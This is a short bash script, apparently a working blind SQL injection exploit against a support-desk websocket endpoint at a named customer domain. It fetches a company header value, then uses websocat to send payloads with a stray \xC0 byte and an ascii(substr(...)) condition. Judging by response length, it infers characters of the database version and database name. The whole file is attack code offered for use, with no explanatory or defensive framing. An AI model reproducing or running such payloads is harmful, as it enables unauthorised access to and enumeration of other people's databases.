#!/bin/bash
company=$(curl -k -s https://support.customer.de/get_portal_info|cut -d'=' -f2|tail -n1|cut -d';' -f1|tr -d '\n\r')

extract_version() {
    echo "🔍 VERSION extraction:"
    for i in {1..20}; do
        res=$(echo -ne "1\n\n0\n\xC0';if(ascii(substr(version(),$i,1))>47,1,0)-- -\n" | websocat -k wss://support.customer.de/nw --protocol "ingredi support desk customer thin" -H "X-Ns-Company: $company" --binary 2>/dev/null | wc -c)
        [ $res -gt 3 ] && echo -n "$i:" || echo -n "_"
    done
    echo ""
}

extract_dbname() {
    echo "🔍 DBNAME extraction:"
    for i in {1..20}; do
        res=$(echo -ne "1\n\n0\n\xC0';if(ascii(substr(database(),$i,1))>47,1,0)-- -\n" | websocat -k wss://support.customer.de/nw --protocol "ingredi support desk customer thin" -H "X-Ns-Company: $company" --binary 2>/dev/null | wc -c)
        [ $res -gt 3 ] && echo -n "$i:" || echo -n "_"
    done
    echo ""
}

extract_version
extract_dbname
